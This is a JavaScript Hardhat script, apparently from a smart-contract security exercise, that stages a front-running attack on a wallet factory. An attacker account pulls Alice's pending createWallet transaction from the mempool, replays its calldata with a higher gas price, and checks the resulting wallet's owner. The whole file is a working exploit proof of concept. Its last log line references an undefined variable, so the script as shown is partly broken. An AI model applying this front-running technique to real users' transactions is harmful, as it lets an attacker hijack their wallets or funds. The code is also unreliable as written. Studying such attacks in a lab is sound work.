let { expect } = require('chai');
let { ethers } = require('hardhat');
let 
  {abi:WalletContractAbi}
 = require('../contracts/Fix/artifacts/Wallet.json');


  let owner, alice, attacker, factory;

  async function createTraders (){
    [owner, alice, attacker] = await ethers.getSigners();
    let Factory = await ethers.getContractFactory('FactoryContract');
    factory = await Factory.connect(owner).deploy();

    }


    async function performAttack() {
      console.log("Starting attack...\n");
    
      let salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes('Something'));
      
      console.log("Alice creating wallet...\n");
      await factory.connect(alice).createWallet(salt);
    
      console.log("Getting transactions from mempool...\n");
      let txs = await ethers.provider.send('eth_getBlockByNumber', [
        'pending',
        true,
      ]);
    
      console.log("Finding Alice's transaction...\n");
      let tx = txs.transactions.find(
        (tx) => tx.to === factory.address.toLowerCase() && 
                tx.from === alice.address.toLowerCase()
      );
      if (!tx) {
        console.log("Couldn't find Alice's transaction in the mempool\n");
        return;
      }
    
      console.log("Attacker sending front-running transaction...\n");
      await attacker.sendTransaction({
        to: tx.to,
        data: tx.input,
        gasPrice: ethers.BigNumber.from(tx.gasPrice).add(100),
        gasLimit: ethers.BigNumber.from(tx.gas).add(100000),
      });
    
      console.log("\nMining transactions...\n");
      await ethers.provider.send('evm_mine', []);
    
      console.log("Getting wallet address...");
      let addressOfWallet = await factory.walletOwner(attacker.address);
      console.log("Wallet address:", addressOfWallet);
    
      if (addressOfWallet === ethers.constants.AddressZero) {
        console.log("Attack failed: No wallet created for attacker");
        return;
      }
    
      console.log("Getting wallet contract...\n");
      let wallet = await ethers.getContractAt(
        WalletContractAbi,
        addressOfWallet,
        attacker
      );
    
      console.log("Checking results...\n");
      aliceWallet = await factory.walletOwner(alice.address);
      walletOwner = await wallet.owner();
    
      console.log("Alice's wallet:", aliceWallet);
      console.log("Attacker's address:", attacker.address)
      console.log("Wallet owner:", walletOwner);
      console.log("Wallet address:", isInitialized);
    
    }

async function startAttack(){
      console.log("Creating Alice Attacker and Owner....")
      await createTraders()
      console.log("Traders created starting attack....")
      await performAttack()
}


startAttack()



